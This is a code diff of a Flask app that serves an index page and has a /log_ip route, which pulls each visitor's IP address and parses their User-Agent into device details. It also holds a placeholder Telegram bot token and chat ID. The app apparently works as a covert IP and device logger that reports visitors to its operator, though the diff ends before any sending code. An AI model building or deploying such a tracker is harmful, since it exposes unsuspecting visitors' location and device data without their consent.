@@ -4,28 +4,22 @@ from user_agents import parse
 import os, base64, time
 from pathlib import Path
 
-# Vercel paths fix
-BASE_DIR = Path(__file__).resolve().parent
-STATIC_DIR = BASE_DIR / 'static'
+# Root path fix
+BASE_DIR = Path(__file__).resolve().parent.parent
 
-app = Flask(__name__, static_folder=str(STATIC_DIR), static_url_path='')
+app = Flask(__name__)
 
-# Vercel Environment Variables se uthayega
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "YAHAN_APNA_TOKEN_DALO")
 MY_CHAT_ID = os.environ.get("MY_CHAT_ID", "YAHAN_APNI_CHAT_ID_DALO")
 
 @app.route('/')
 def home():
-    return send_from_directory(str(STATIC_DIR), 'index.html')
+    return send_from_directory(str(BASE_DIR), 'index.html')
 
 @app.route('/log_ip', methods=['POST'])
 def log_ip():
     data = request.json
-    
-    # IP Extraction
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    
-    # Device Info Extraction
     ua_string = request.headers.get('User-Agent', 'Unknown')
     user_agent = parse(ua_string)
     
